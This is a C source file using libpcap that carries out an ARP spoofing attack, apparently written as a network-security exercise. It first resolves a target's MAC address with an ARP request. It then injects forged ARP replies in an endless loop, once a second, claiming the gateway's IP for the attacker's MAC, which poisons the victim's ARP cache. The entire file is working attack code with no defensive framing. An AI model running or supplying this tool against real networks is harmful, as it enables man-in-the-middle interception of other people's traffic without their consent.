#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include "getInfo.h"

#define TRUE 1
#define FALSE 0

int getVictimMAC(pcap_t * handle, const struct in_addr IP, struct ether_addr *MAC);
void  arpSpoofing(pcap_t * handle, const struct in_addr victimIP, const struct ether_addr victimMAC,
	const struct in_addr gatewayIP, const struct ether_addr attackerMAC);
void  arpMake(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC,
	const struct in_addr recvIP, const struct ether_addr recvMAC, uint16_t ARPop);
void init_handle(pcap_t ** handleptr, char **dev);

int main(int argc, char * argv[])
{
	struct in_addr attackerIP, victimIP, gatewayIP;
	struct ether_addr attackerMAC, victimMAC;
	struct myInfo attackInfo;
	pcap_t * handle;
	char * dev;
	
	init_handle(&handle, &dev); 
	inet_aton(argv[1], &victimIP); //victim(target) IP

	attackInfo = getMyInfo();
	attackerIP = attackInfo.IP; 
	attackerMAC = attackInfo.MAC; 

	getVictimMAC(handle, victimIP, &victimMAC); //get victimMAC

	gatewayIP = getGatewayIP(); //send manipulated arp reply packet
	
	arpSpoofing(handle, victimIP, victimMAC, gatewayIP, attackerMAC);

	//testing
	/*printf("gateway IP : %s\n", inet_ntoa(gatewayIP));
	printf("Attacker MAC : %s\n", ether_ntoa(&attackerMAC));
	printf("Attacker IP : %s\n", inet_ntoa(attackerIP));
	printf("Victim IP : %s\n", inet_ntoa(victimIP));*/

	return 0;
}

int getVictimMAC(pcap_t * handle, const struct in_addr IP, struct ether_addr *MAC)
{	
	struct ether_addr bMAC; //broadcast
	struct ether_header *etherHdr;
	struct ether_arp *arpHdr;
	struct pcap_pkthdr *recvHdr;
	struct myInfo me;
	int response = FALSE;

	const u_char *recvPacket;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];

	ether_aton_r("ff:ff:ff:ff:ff:ff", &bMAC);
	
	me = getMyInfo();
	//make arp request to get victim mac
	arpMake(packet, me.IP, me.MAC, IP, bMAC, ARPOP_REQUEST); //request = 1


	while (1)
	{
		if (pcap_inject(handle, packet, sizeof(packet)) == -1)
		{
			printf("getVictimMAC pcap_inject error\n");
			pcap_close(handle);			
			exit(1);
		}

		response = pcap_next_ex(handle, &recvHdr, &recvPacket);
		if (response != TRUE)
			continue;

		//check whether arp
		etherHdr = (struct ether_header *)recvPacket;
		if (etherHdr->ether_type != htons(ETHERTYPE_ARP))
			continue;

		arpHdr = (struct ether_arp *)(recvPacket + sizeof(struct ether_header));
		if (arpHdr->arp_op != htons(ARPOP_REPLY)) //response = 2
			continue;
		if (memcmp(&arpHdr->arp_spa, &IP.s_addr, sizeof(in_addr_t)) != FALSE)
			continue;

		memcpy(&MAC->ether_addr_octet, &arpHdr->arp_sha, ETHER_ADDR_LEN);

		break;
	}
	
	return 0;
}


void init_handle(pcap_t ** handleptr, char **dev)
{
	char errbuf[PCAP_ERRBUF_SIZE];

	*dev = pcap_lookupdev(errbuf);
	if (dev == NULL)
	{
		printf("%s\n", errbuf);
		exit(1);
	}

	*handleptr = pcap_open_live(*dev, BUFSIZ, 0, -1, errbuf);
	if (*handleptr == NULL)
	{
		printf("%s\n", errbuf);
		exit(1);
	}
	return;
}



void  arpSpoofing(pcap_t * handle, const struct in_addr victimIP, const struct ether_addr victimMAC,
	const struct in_addr gatewayIP, const struct ether_addr attackerMAC)
{
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];	
	
	arpMake(packet, gatewayIP, attackerMAC, victimIP, victimMAC, ARPOP_REPLY); //reply is 2

	while (1)
	{
		if (pcap_inject(handle, packet, sizeof(packet)) == -1)
		{
			printf("pcap_inject error in spoofing\n");
			pcap_close(handle);
			exit(1);
		}
		sleep(1);
	}

	return;
}


//no problem
void  arpMake(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC,
	const struct in_addr recvIP, const struct ether_addr recvMAC, uint16_t ARPop)
{
	struct ether_header etherHdr;
	struct ether_arp arpHdr;

	etherHdr.ether_type = htons(ETHERTYPE_ARP);
	memcpy(etherHdr.ether_dhost, &recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(etherHdr.ether_shost, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);

	//arpHdr.arp_hrd = 1;
	arpHdr.arp_hrd = htons(ARPHRD_ETHER);
	//arpHdr.arp_pro = 2048; //0x0800
	arpHdr.arp_pro = htons(ETHERTYPE_IP);
	//arpHdr.arp_hln = 6;
	arpHdr.arp_hln = ETHER_ADDR_LEN;
	//arpHdr.arp_pln = 4;
	arpHdr.arp_pln = sizeof(in_addr_t);
	arpHdr.arp_op = htons(ARPop); // 1:request, 2:reply

	memcpy(&arpHdr.arp_tha, &recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arpHdr.arp_tpa, &recvIP.s_addr, sizeof(in_addr_t));
	memcpy(&arpHdr.arp_sha, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arpHdr.arp_spa, &sendIP.s_addr, sizeof(in_addr_t));

	memcpy(packet, &etherHdr, sizeof(struct ether_header));
	memcpy(packet + sizeof(struct ether_header), &arpHdr, sizeof(struct ether_arp));
	return;
}